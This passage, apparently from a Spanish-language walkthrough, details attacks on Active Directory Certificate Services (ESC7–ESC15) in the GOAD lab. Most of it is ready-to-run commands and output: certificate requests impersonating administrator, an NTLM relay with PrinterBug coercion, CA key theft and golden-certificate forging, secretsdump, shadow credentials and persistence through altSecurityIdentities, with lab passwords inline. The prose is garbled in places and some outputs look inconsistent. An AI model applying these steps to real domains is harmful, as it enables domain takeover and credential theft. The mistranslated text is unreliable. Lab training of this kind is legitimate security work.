      Access Rights               : ESSOS\Enterprise Admins       Access: GenericAll
      Access Rights               : ESSOS\viserys.targaryen       Access: ManageCA
      Access Rights               : ESSOS\viserys.targaryen       Access: ManageCertificates
```

Perfecto. `viserys.targaryen`ha ManageCA y ManageCerttificates derechos en GOAD.

### Gestión de la explotación de los derechos

Los derechos de ManageCA son como tener las llaves del reino. Esto es lo que puedes hacer:

```bash
# If you have ManageCA, you can:
# 1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.

# 2. Certificate manager rights
# As the Certify output indicated, viserys.targaryen already possesses ManageCA and ManageCertificates rights in our GOAD scenario.
# An attacker gaining these rights would typically do so by compromising an account that already has them, or by escalating to a level
# where they can modify the CA's Active Directory object permissions or the CA server's local groups.
# With ManageCA rights, one can assign officer rights (ManageCertificates) through the Certificate Authority console (certsrv.msc).

# 3. Restart services to apply changes
Restart-Service CertSvc
```

### Gestión de la explotación de derechos de los certificados

Con ManageCertificates, apruebe las solicitudes pendientes. En primer lugar, envíe una solicitud para un usuario privilegiado utilizando la plantilla SubCA:

```bash
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:SubCA /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\viserys.targaryen
[*] Template                : SubCA
[*] Subject                 : CN=viserys.targaryen, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : Taken Under Submission
[*] Request ID              : 14

# The request is pending, now approve it with ManageCertificates permission
certutil -config "braavos.essos.local\ESSOS-CA" -approve 14

# Expected output:
# Request 14 approved.
# CertUtil: -approve command completed successfully.

# Retrieve the issued certificate
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /retrieve 14

[*] Action: Retrieve Certificates
[*] Request ID: 14
[*] Certificate retrieved successfully
```

# ESC8: NTLM Relay a AD CS HTTP endpoints

ESC8 es donde las cosas se ponen realmente interesantes. Combina ADCS con ataques de relé NTLM, apuntando a los endpoints de inscripción de certificados basados en HTTP. Me encanta esta técnica porque apalanca dos vectores de ataque diferentes juntos.

### Prerrequisitos

En GOAD, tenemos las condiciones perfectas para ESC8:

- Inscripción web ADCS **habilitada**
- **Punto final de inscripción HTTP** accesible en `http://braavos.essos.local/certsrv/`
- Podemos realizar ataques de **relevos NTLM**

El relevo NTLM funciona contra las páginas de inscripción HTTP y HTTPS; el protocolo importa menos que si se requieren tokens de recompresión extendida para la autenticación (EPA) o en la unión de canales. Habilite a la EPA y requiere que SSL rompa el ataque de relevos.

### Implementación de ataques

Pracifiquemos primero el endpoint de la inscripción web:

```bash
# Check if ADCS web enrollment is accessible
curl -I http://braavos.essos.local/certsrv/certfnsh.asp

HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
Date: Thu, 03 Jan 2025 16:45:12 GMT
```

Perfecto. Solicita la autenticación NTLM. Ahora pongamos el ataque de relevos:

```bash
# Set up NTLM relay to ADCS HTTP endpoint
python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"

Impacket v0.11.0 - Copyright 2023 Fortra
Note: Output may vary slightly between versions - banners truncated for brevity

[*] Protocol Client DCOM loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

# In another terminal, trigger authentication from target DC
python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local

[*] Impacket v0.11.0 - Copyright 2023 Fortra
[*] Attempting to trigger authentication via rprn RPC at meereen.essos.local
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked

# Back in ntlmrelayx window:
[*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled, attacking target http://braavos.essos.local
HTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64
[*] ADCS attack completed. Generated certificate for user MEEREEN$

# Certificate successfully obtained!
```

Convirtamos y usemos el certificado:

```bash
# Convert base64 certificate for use
cat /tmp/MEEREEN$cert.b64 | base64 -d > meereen.pfx

# Ask for a TGT with the machine certificate
gettgtpkinit.py essos.local/meereen$ -pfx-file meereen.pfx meereen.ccache

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache file meereen.ccache
[*] Requesting TGT for meereen$@essos.local using Kerberos PKINIT
[+] TGT request successful!
[*] Saved TGT to meereen.ccache

# Use machine certificate for further attacks or DCSync
```

# ESC9: Sin extensión de seguridad

ESC9 es oro puro para persistencia. Efecta las plantillas de certificados que no requieren la extensión de seguridad szOID-NTDS-CA-SECURITY-EXT en certificados emitidos. Esto significa que sus certificados siguen funcionando incluso cuando cambian las contraseñas.

### Detalles de vulnerabilidad

Cuando los certificados carecen de la extensión de seguridad, proporcionan autenticación persistente que sobreviven a los cambios de contraseña. Esto es lo que los hace perfectos para mantener el acceso a largo plazo.

### Punto clave

Certificado expedido de un `NO_SECURITY_EXTENSION`La plantilla seguirá mapeando incluso después de que el usuario cambie su contraseña, haciéndolo perfecto para la persistencia.

### Proceso de explotación

Vamos a probar esto en nuestro entorno GOAD:

```bash
# Find templates without security extension requirement
Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC9
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : NO_SECURITY_EXTENSION, INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow

# Request certificate for current user (missandei)
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC9

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC9
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 15

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate without security extension...
-----END CERTIFICATE-----

# Test authentication with current certificate

Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

# Now change the user's password
net user missandei "NewComplexPassword123!" /domain

The command completed successfully.

# Certificate still works for authentication even after password change!

Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

  UserName                 : missandei
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 5:30:45 PM
  EndTime                  : 1/4/2025 3:30:45 AM
  RenewTill                : 1/10/2025 5:30:45 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable

# Perfect persistence! The certificate still authenticates despite password change
```

### Análisis de la plantilla

Comprobar si la plantilla requiere extensión de seguridad en GOAD:

```bash
$templateDN = "CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
$template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag

# The CT_FLAG_NO_SECURITY_EXTENSION flag value is 0x80000 (524288)
$NoSecurityExtensionFlag = 0x80000

if ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {
    Write-Host "Template '$($template.Name)' has the NO_SECURITY_EXTENSION flag set."
} else {
    Write-Host "Template '$($template.Name)' does NOT have the NO_SECURITY_EXTENSION flag set."
}

# Output shows template has NO_SECURITY_EXTENSION flag set - perfect for persistence!
```

# ESC10: mapeo de certificados débiles

ESC10 explota configuraciones de mapas de certificados a cuenta débiles y vulnerabilidades de asignación de certificados.

### Vectores de ataque

**ESC10A - Escribir el acceso a altSecurityIdentities:**

- Los atacantes con permisos de escritura en objetos de usuario pueden modificar `altSecurityIdentities`
- Esto atribuye los certificados de mapas a las cuentas de usuario
- Mapeo malicioso permite autenticación basada en certificados como otros usuarios

**ESC10B - Métodos de mapeo de certificados débiles:**

- Explota débil `CertificateMappingMethods`Configuración del registro
- Permite autenticación de certificado con la coincidencia parcial de sujetos

### Ejemplo de explotación

Vamos a probar ESC10A en GOAD:

```bash
# ESC10A - Modify altSecurityIdentities attribute
# First, create a computer account and request machine certificate
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Password123!' essos/missandei:fr3edom@meereen.essos.local

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account EVIL$ with password Password123!.

# Request machine certificate for our new computer
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:Machine /machine

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\EVIL$
[*] Template                : Machine
[*] Subject                 : CN=EVIL, CN=Computers, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 18

# Extract certificate details (issuer, serial number)
certutil -dump evil.pem

Certificate:
    Serial Number: 6100000028f9b2d3c5a1b4e87a00000000000028
    Issuer: CN=ESSOS-CA, DC=essos, DC=local
    Subject: CN=EVIL, CN=Computers, DC=essos, DC=local

# Modify target user's altSecurityIdentities to map to our certificate
$dn = "CN=administrator,CN=Users,DC=essos,DC=local"
$mapping = "X509:<I>CN=ESSOS-CA,DC=essos,DC=local<S>6100000028f9b2d3c5a1b4e87a00000000000028"
Set-ADObject -Identity $dn -Replace @{'altSecurityIdentities' = $mapping}

# Authenticate as administrator using our EVIL$ machine certificate

Rubeus.exe asktgt /user:administrator /certificate:evil.pfx /password:Password123!

[*] Action: Ask TGT
[*] Using certificate mapping via altSecurityIdentities
[*] Using PKINIT with etype rc4_hmac and subject: CN=EVIL, CN=Computers, DC=essos, DC=local
[+] TGT request successful!

  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 6:45:12 PM
  EndTime                  : 1/4/2025 4:45:12 AM
  RenewTill                : 1/10/2025 6:45:12 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
```

Perfecto. Hemos utilizado con éxito ESC10A para autenticar como administrador usando un certificado de máquina mapeado a través de `altSecurityIdentities`.

# ESC11: IF-ENFORCEENCPTICERTREQUEST

ESC11 se dirige a CAs configurados con la bandera de IF-ENFORCEENCPTICERTREQUEST, que se puede eludir en ciertas condiciones.

### Vector de ataque

ESC11 explota la manipulación de llamadas RPC cuando las solicitudes de certificado se transmiten sin cifrar a la Autoridad de Certificados.

**Importante:** La "petición sin cifrado" sólo tiene éxito cuando la CA ha `IF_ENFORCEENCRYPTICERTREQUEST`- Abrenados. Si se establece esta bandera (el seguro de las versiones Windows modernas), la interfaz RPC obliga a la privacidad del paquete y el relé NTLM falla.

### Prerrequisitos

Revisemos la configuración de GOAD CA. Compruebe si CA tiene la bandera de la bandera de IF-ENFORCEEPTPTICERTREQUEST despejada:

```bash
certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\InterfaceFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\InterfaceFlags REG_DWORD = 0x0 (0)

```

H0x0 = vulnerable (no se requiere cifrado), 0x200 = endurecido (requerimiento necesario). IF-ENFORCEENCRYPTICERTREQUEST NO se establece (bandera sería 0x200) - esto hace que la CA sea vulnerable a ESC11.

1. **CA ha despejado la bandera de IF-ENFORCEENCRYPTICERTREQUEST**.
2. **Solicitud de certificado no cifrada**

### Técnica de circunvalación

```csharp
// Create unencrypted certificate request for GOAD environment
public class ESC11Exploit
{
    public string CreateUnencryptedRequest(string subject, string altname = "administrator@essos.local")
    {
        var request = new CX509CertificateRequestPkcs10();
        var privateKey = new CX509PrivateKey();
        
        // Configure for unencrypted submission to GOAD CA
        privateKey.ProviderName = "Microsoft Software Key Storage Provider";
        privateKey.Create();
        
        request.InitializeFromPrivateKey(
            X509CertificateEnrollmentContext.ContextUser,
            privateKey,
            "");
            
        request.Subject = new CX500DistinguishedName(subject);
        
        // Add SAN for GOAD domain
        var sanExtension = new CX509ExtensionAlternativeNames();
        var altNames = new CAlternativeNames();
        var altNameObj = new CAlternativeName();
        
        altNameObj.InitializeFromString(
            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,
            altname);
        altNames.Add(altNameObj);
        
        sanExtension.InitializeEncode(altNames);
        request.X509Extensions.Add(sanExtension);
        
        // Submit without encryption to vulnerable GOAD CA
        return request.Encode();
    }
}
```

El código de la categoría anterior demuestra cómo se puede construir una solicitud de certificado (CSR). Para el ataque actual ESC11, un atacante normalmente usaría una herramienta como una adaptación `ntlmrelayx.py`o herramienta personalizada para transmitir la autenticación entrante de NTLM (por ejemplo, de una cuenta de máquina coaccionada) al servidor ADCS `ICertRequestD`Interfaz DCOM sobre RPC no cifrada. Una vez establecido el relevo NTLM, la herramienta del atacante presenta la RSE (como la generada anteriormente, a menudo para una cuenta privilegiada o una cuenta de máquina con un SAN útil) en nombre de la cuenta relevada. Si tiene éxito, la CA emite el certificado para el objetivo especificado en la RSE, otorgando efectivamente crecientes privilegios.

# ESC12: Acceso SHELL a CA Server

ESC12 es el santo grial - cuando se obtiene acceso a la shell al servidor de la Autoridad de Certificados. En este punto, básicamente tienes toda la infraestructura de PKI.

ESC12 también cubre las vulnerabilidades de YubiHSM descubidas por Hans-Joachim Knobloch, pero este vector de ataque específico no se aplica en el entorno estándar de GOAD.

En GOAD, el servidor de CA es `braavos.essos.local`. Digamos que lo hemos comprometido:

### Creación de certificados de oro (CA Private Key Compromise)

Cuando tenga acceso de administrador de CA (como `khal.drogo`en GOAD), puede extraer la clave privada de CA y falsificar certificados de oro:

```bash
# Extract CA certificate and private key with certipy
certipy ca -backup -u khal.drogo@essos.local -p horse -dc-ip 192.168.56.12 -ca 'ESSOS-CA' -target 192.168.56.23 -debug

[*] Action: Backup CA
[*] Backing up CA 'ESSOS-CA'
[*] Saved certificate and private key to 'ESSOS-CA.pfx'

# Forge a certificate as domain admin
certipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local

[*] Action: Forge Certificate
[*] Forged certificate saved to 'administrator_forged.pfx'

# Authenticate with schannel
certipy auth -pfx administrator_forged.pfx -ldap-shell

[*] Action: Authenticate
[*] LDAP shell available

# add_user newdomainadmin
# add_user_to_group newdomainadmin "Domain admins"

# Alternative: Authenticate with PKINIT
# First request a valid certificate as template
certipy req -u 'khal.drogo@essos.local' -p horse -ca 'ESSOS-CA' -template User -target 192.168.56.23

# Reforge with template to fix CRL issues
certipy forge -ca-pfx 'ESSOS-CA.pfx' -upn administrator@essos.local -template khal.drogo.pfx


Rubeus.exe asktgt /user:administrator /certificate:administrator_forged.pfx /password:mimikatz

# Or use gettgtpkinit.py
gettgtpkinit.py -cert-pfx administrator_forged.pfx -dc-ip 192.168.56.12 "essos.local/administrator" admin_tgt.cccache

export KRB5CCNAME=/workspace/admin_tgt.cccache
secretsdump.py -k meereen.essos.local -dc-ip 192.168.56.12
```

### Técnicas post-expansión

# ESC13: Enlaces de grupo OID de la política de emisión

ESC13 explota la función ADCS donde las plantillas de certificados pueden tener políticas de emisión con enlaces de grupo OID a los grupos de Active Directory. Esto permite a los directores acceder como miembros de grupos vinculados solicitando certificados con las políticas de emisión apropiadas.

### Detalles técnicos

Este ataque abusa de la función de Aventura Mecanismo de Aventura (AMA) de Microsoft donde:

- Las plantillas de certificados contienen políticas de emisión (almacenadas `msPKI-Certificate-Policy`atributo)
- Las políticas de emisión pueden vincularse a los grupos AD a través de `msDS-OIDToGroupLink`atributo
- Al autenticarse con dichos certificados, los usuarios obtienen permisos de membresía en grupo

### Requisitos

1. **Principal tiene derechos** de **inscripción** en una plantilla de certificado
2. **La plantilla de certificados tiene una extensión de la política de emisión**
3. **Las políticas de emisión pueden vincularse a los grupos AD a través de `msDS-OIDToGroupLink`atributo**
4. **Sin requisitos de emisión** que el principal no pueda cumplir
5. **EKUs permiten la autenticación del cliente**

### Proceso de explotación

Vamos a comprobar las condiciones de ESC13 en GOAD:

```bash
# Find templates with issuance policies linked to groups in essos.local
Import-Module ActiveDirectory

$templates = Get-ADObject -Filter 'objectClass -eq "pKICertificateTemplate"' -Properties msPKI-Certificate-Policy -SearchBase "CN=Configuration,DC=essos,DC=local"

foreach ($template in $templates) {
    if ($template.'msPKI-Certificate-Policy') {
        $policies = $template.'msPKI-Certificate-Policy'
        foreach ($policy in $policies) {
            $oid = Get-ADObject -Filter * -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties msDS-OIDToGroupLink | Where-Object {$_.msDS-OIDToGroupLink -and $policy -eq $_.'msPKI-Cert-Template-OID'}
            if ($oid.'msDS-OIDToGroupLink') {
                Write-Host "Template $($template.Name) linked to group: $($oid.'msDS-OIDToGroupLink')"
            }
        }
    }
}

Template ESC13Template linked to group: CN=Enterprise Admins,CN=Users,DC=essos,DC=local

# Perfect! ESC13Template is linked to Enterprise Admins

# Request certificate from vulnerable template
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC13Template

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC13Template
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 17

# Authenticate with certificate to gain Enterprise Admin group membership

Rubeus.exe asktgt /user:missandei /certificate:esc13.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

# The TGT now contains Enterprise Admins group membership!
# Verify with whoami /groups after using the ticket

Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...

[*] Action: Import Ticket
[+] Ticket successfully imported!

# Now we have Enterprise Admin privileges in the forest
net group "Enterprise Admins" /domain

Group name     Enterprise Admins
Comment        Designated administrators of the enterprise

Members

-------------------------------------------------------------------------------
Administrator  missandei
The command completed successfully.
```

### Requisitos de grupo

El grupo vinculado debe ser:

- **Vacíos** (sin miembros reales)
- **Alcance universal** (en todo el bosque)

Los grupos universales comunes incluyen Administración de Empresa, Administradores de Schema, Administradores de la Clave Empresarial.

# ESC14: Credenciales SHADOW y mapeo de certificados avanzados

ESC14 representa técnicas avanzadas de cartografía de certificados que van más allá de la base `altSecurityIdentities`manipulación cubierta en el CES10. Esta técnica se centra en credenciales en la sombra y sofisticados escenarios de mapeo de certificado a cuenta.

### Antecedentes técnicos

ESC14 explota mecanismos avanzados de cartografía de certificados, entre ellos:

- **Credenciales en la sombra:** Abusing `msDS-KeyCredentialLink`atributo para autenticación basada en certificados
- **Cartografía avanzada de certificado:** Manipulación sofisticada de las relaciones de certificado a cuenta
- **Abuso de certificado de dominio cruzado:** Apoyo de mapas de certificados a través de límites de dominio

### Escenarios de ataque

**ESC14A - Abuso de Credenciales en la Sombra:**

- Los atacantes con permisos de escritura en los objetos de usuario pueden añadir credenciales para sombras
- Permite la autenticación basada en certificados sin la inscripción de certificado tradicional
- Elude muchos controles tradicionales ADCS

**ESC14B - Cartografía de certificados avanzado:**

- Sofisticidos escenarios de cartografía de certificados más allá de las técnicas básicas ESC10
- Abuso de certificado cruzado en entornos multidominio como GOAD
- Mecanismos de persistencia de cartografía de certificados

### Proceso de explotación

Demostremos técnicas ESC14 en nuestro entorno GOAD. ESC14A - altSecurityIdentities Manipulation en GOAD:

```bash
# First, create a computer account for certificate mapping
addcomputer.py -method ldaps -computer-name 'esc14computer$' -computer-pass 'Il0veCertific@te' -dc-ip 192.168.56.12 essos/missandei:fr3edom@192.168.56.12

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account esc14computer$ with password Il0veCertific@te.

# Request machine certificate for our created computer
certipy req -target braavos.essos.local -u 'esc14computer$@essos.local' -p 'Il0veCertific@te' -dc-ip 192.168.56.12 -template Machine -ca ESSOS-CA -debug

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\esc14computer$
[*] Template                : Machine
[*] Subject                 : CN=esc14computer, CN=Computers, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 25

# Extract certificate details for mapping
certipy cert -pfx esc14computer.pfx -nokey -out "esc14computer.crt"
openssl x509 -in esc14computer.crt -noout -text

Certificate:
    Data:
        Serial Number: 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11
        Issuer: CN=ESSOS-CA, DC=essos, DC=local
        Subject: CN=esc14computer, CN=Computers, DC=essos, DC=local

# Check current altSecurityIdentities
ldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities

[{
  "altSecurityIdentities": [],
  "dn": "CN=khal.drogo,CN=Users,DC=essos,DC=local"
}]
```

### X509 Formato de Cartografía de Certificado

El artículo de referencia proporciona un script Python para formatear correctamente la asignación X509:

```python
import argparse

def get_x509_issuer_serial_number_format(serial_number: str, issuer_distinguished_name: str) -> str:
    """
    Formats the X509IssuerSerialNumber for the altSecurityIdentities attribute.
    :param serial_number: Serial number in the format "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11"
    :param issuer_distinguished_name: Issuer distinguished name, e.g., "CN=ESSOS-CA,DC=essos,DC=local"
    :return: Formatted X509IssuerSerialNumber
    """
    serial_bytes = serial_number.split(":")
    reversed_serial_number = "".join(reversed(serial_bytes))
    issuer_components = issuer_distinguished_name.split(",")
    reversed_issuer_components = ",".join(reversed(issuer_components))
    return f"X509:<I>{reversed_issuer_components}<SR>{reversed_serial_number}"

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Format X509 Issuer Serial Number")
    parser.add_argument("-serial", required=True, help="Serial number in format 43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11")
    parser.add_argument("-issuer", required=True, help="Issuer Distinguished Name e.g., CN=ESSOS-CA,DC=essos,DC=local")

    args = parser.parse_args()
    formatted_value = get_x509_issuer_serial_number_format(args.serial, args.issuer)
    print(formatted_value)

# Usage:
python3 x509_issuer_serial_number_format.py -serial "43:00:00:00:11:92:78:b0:92:e5:16:88:a6:00:00:00:00:00:11" -issuer "CN=ESSOS-CA,DC=essos,DC=local"

X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>110000000000a68816e592b078921100000043
```

### Modificación del atributo LDAP

Script para modificar el atributo altSecurityIdentidades:

```python
import ldap3

dn = "CN=khal.drogo,CN=Users,DC=essos,DC=local"
user = "essos.local\\missandei"
password = "fr3edom"
server = ldap3.Server('meereen.essos.local')
ldap_con = ldap3.Connection(server=server, user=user, password=password, authentication=ldap3.NTLM)
ldap_con.bind()

# Set the certificate mapping
ldap_con.modify(dn, {
    'altSecurityIdentities': [(ldap3.MODIFY_REPLACE, 'X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>110000000000a68816e592b078921100000043')]
})

print(ldap_con.result)
ldap_con.unbind()

# Verify the mapping was set
ldeep ldap -u missandei -d essos.local -p fr3edom -s ldap://192.168.56.12 search '(samaccountname=khal.drogo)' altSecurityIdentities

[{
  "altSecurityIdentities": [
    "X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>110000000000a68816e592b078921100000043"
  ],
  "dn": "CN=khal.drogo,CN=Users,DC=essos,DC=local"
}]

# Authenticate as khal.drogo using our machine certificate!
gettgtpkinit.py -cert-pfx esc14computer.pfx -dc-ip 192.168.56.12 "essos.local/khal.drogo" khal_tgt.ccache

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting TGT for khal.drogo@essos.local using Kerberos PKINIT
[+] TGT request successful!
[*] Saved TGT to khal_tgt.ccache
```

### Persistencia avanzada con ESC14

```bash
# ESC14 Persistence - Shadow Credentials for Domain Admin
# Add shadow credentials to Domain Admin account (if we have permissions)
python3 pywhisker.py -d essos.local -u khal.drogo -p horse --target administrator --action add --dc-ip 192.168.56.12

[*] Target user found: CN=Administrator,CN=Users,DC=essos,DC=local
[*] Adding KeyCredential to the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved certificate to administrator_shadow.crt
[*] Saved private key to administrator_shadow.pem

# This provides persistent access to Domain Admin even after password changes
gettgtpkinit.py -cert-pem administrator_shadow.pem -key-pem administrator_shadow.pem essos.local/administrator admin_shadow.ccache

# ESC14 Advanced Mapping - Multiple Certificate Mappings
# Add multiple certificate mappings for redundancy
$certificates = @(
    "X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>6100000000001a68816e592b078921100000043",
    "X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>6100000000001a68816e592b078921100000044",
    "X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>6100000000001a68816e592b078921100000045"
)

foreach ($cert in $certificates) {
    $currentMappings = (Get-ADUser administrator -Properties altSecurityIdentities).altSecurityIdentities
    $newMappings = $currentMappings + $cert
    Set-ADUser administrator -Replace @{'altSecurityIdentities' = $newMappings}
}

# Verify multiple mappings
Get-ADUser administrator -Properties altSecurityIdentities | Select-Object -ExpandProperty altSecurityIdentities

X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>6100000000001a68816e592b078921100000043
X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>6100000000001a68816e592b078921100000044
X509:<I>DC=local,DC=essos,CN=ESSOS-CA<SR>6100000000001a68816e592b078921100000045
```

### Diferencias clave de ESC10

ESC14 difiere del CES10 de varias maneras importantes:

- **Credenciales de sombra** : Usos `msDS-KeyCredentialLink`en lugar de inscripción de certificados tradicionales
- **Abuso de dominio cruzado:** Mapeo sofisticado a través de los límites de dominio
- **Persistencia avanzada** : Múltiples técnicas de mapeo para redundancia
- **Paseas controles tradicionales:** Funciona en torno a muchas medidas de seguridad de ADCS

### Remediación

1. **Monitorear Atributos clave** : Vigilar los cambios en `msDS-KeyCredentialLink`y `altSecurityIdentities`
2. **Restringir Permisos** : Limitar el acceso a los objetos de usuario, especialmente cuentas de alto privilegio
3. **Cross-Domain Hardening** : Implementar la estricta validación de la asignación de certificados a través de límites de dominio
4. **Auditorías regulares** : Cartografías periódicas de certificados de auditoría y credenciales en la sombra

# ESC15: Versión 1 Políticas de Aplicación de la Plantilla (CVE-2024-49019)

ESC15, también conocido como "EKUwu", explota una vulnerabilidad en las plantillas de certificados de la versión 1 donde los atacantes pueden especificar políticas de aplicación arbitrarias en las solicitudes de certificado, anulando el uso clave extendido previsto de la plantilla. Esta vulnerabilidad fue descubierta por Justin Bollinger de TrustedSec y reportada a Microsoft en octubre de 2024.

### Antecedentes técnicos

- **Políticas** de **aplicación** (OID 1.3.6.1.4.1.311) son la extensión patentada de Microsoft
- Cuando existe tanto la Política de Aplicación como la EKU, **la Política de Aplicación prevalece**
- Las plantillas de la versión 1 no validan los campos de la Política de Aplicación en las solicitudes
- Los atacantes pueden agregar políticas peligrosas como Profesor Solicitante de Agencia o Aventura del Cliente

### Condiciones de vulnerabilidad

1. **Versión 1 plantilla de certificado** (escuatro de fichas = 1)
2. **La plantilla permite "Suplemento en la Solicitar"** especificación de asunto
3. **El director tiene derechos** de **inscripción** en la plantilla

### Proceso de explotación

**Importante:** El artículo de referencia GOAD muestra la explotación ESC15 como un **proceso en dos pasos** utilizando las capacidades de Profesor Solicitar capacidades:

```bash
# Step 1: Request certificate with Certificate Request Agent application policy
certipy req -u missandei@essos.local -p fr3edom --application-policies "1.3.6.1.4.1.311.20.2.1" -ca ESSOS-CA -template WebServer -dc-ip 192.168.56.12 -target braavos.essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : WebServer (vulnerable version 1)
[*] Application Policy      : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 19

# Step 2: Use Certificate Request Agent certificate to request admin certificate on-behalf-of
certipy req -u missandei@essos.local -on-behalf-of essos\\administrator -template User -ca ESSOS-CA -pfx missandei.pfx -dc-ip 192.168.56.12 -target braavos.essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] On behalf of            : essos\administrator
[*] Using Certificate Request Agent certificate

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 20

# Step 3: Authenticate as administrator

